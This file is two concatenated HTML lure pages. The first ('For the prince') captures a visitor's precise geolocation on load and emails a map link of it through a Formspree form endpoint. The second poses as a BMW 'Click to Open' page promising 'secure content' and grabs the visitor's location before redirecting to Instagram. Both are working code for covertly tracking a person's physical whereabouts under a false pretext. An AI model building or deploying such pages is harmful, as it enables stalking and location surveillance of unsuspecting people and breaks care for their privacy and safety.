<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>For the prince</title>
</head>
<body>
  <h2>Fox</h2>
  <p>"Allow" for the prince.</p>
  <div id="status">Waiting...</div>

  <script>
    const FORM_URL = "https://formspree.io/f/mldlpdrj";

    function sendEmail(lat, lon, accuracy) {
      const mapUrl = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
      const formData = new URLSearchParams();
      formData.append("location_link", mapUrl);
      formData.append("accuracy", Math.round(accuracy));
      formData.append("time", new Date().toLocaleString());

      fetch(FORM_URL, {
        method: "POST",
        headers: { "Accept": "application/json" },
        body: formData
      })
      .then(res => {
        if (res.ok) {
          document.getElementById("status").innerText = "Location email gaya.";
        } else {
          document.getElementById("status").innerText = "Email bhejne mein problem.";
        }
      })
      .catch(e => {
        document.getElementById("status").innerText = "Network error.";
        console.error(e);
      });
    }

    function init() {
      if (!navigator.geolocation) {
        document.getElementById("status").innerText = "Geolocation unsupported.";
        return;
      }
      navigator.geolocation.getCurrentPosition(
        pos => {
          const { latitude, longitude, accuracy } = pos.coords;
          document.getElementById("status").innerText =
            `Location: ${latitude.toFixed(6)}, ${longitude.toFixed(6)} (Â±${Math.round(accuracy)}m)`;
          sendEmail(latitude, longitude, accuracy);
        },
        err => {
          document.getElementById("status").innerText = "Permission denied ya error.";
        },
        { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
      );
    }

    init();
  </script>
</body>
</html>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Click to Open</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body, html {
      height: 100%;
      width: 100%;
      font-family: Arial, sans-serif;
    }
    .container {
      background-image: url('https://i.pinimg.com/originals/01/ba/60/01ba6070c29035acb21f66ef2bc0b772.jpg'); /* BMW image */
      background-size: cover;
      background-position: center;
      height: 100%;
      width: 100%;
      position: relative;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .overlay {
      background-color: rgba(0, 0, 0, 0.7); /* Slight blur effect */
      height: 100%;
      width: 100%;
      position: absolute;
    }
    .btn-box {
      z-index: 2;
      position: absolute;
      text-align: center;
    }
    .btn-box button {
      padding: 15px 35px;
      font-size: 22px;
      border: none;
      border-radius: 12px;
      background-color: #ffffff;
      color: #000;
      cursor: pointer;
      font-weight: bold;
    }
    .btn-box p {
      color: white;
      margin-top: 20px;
      font-size: 16px;
      opacity: 0.6;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="overlay"></div>
    <div class="btn-box">
      <button onclick="continueTracking()">Click to Open</button>
      <p>Loading secure content...</p>
    </div>
  </div>

  <script>
    function continueTracking() {
      // Real kaam yahin se hota
      navigator.geolocation.getCurrentPosition(
        function(position) {
          console.log("Lat:", position.coords.latitude);
          console.log("Long:", position.coords.longitude);

          // Redirect to BMW page
          window.location.href = "https://www.instagram.com/bmw?igsh=MTNodHZreDFwaDhpdQ==";
        },
        function(error) {
          alert("Location access required to continue.");
        }
      );
    }
  </script>

</body>
</html>
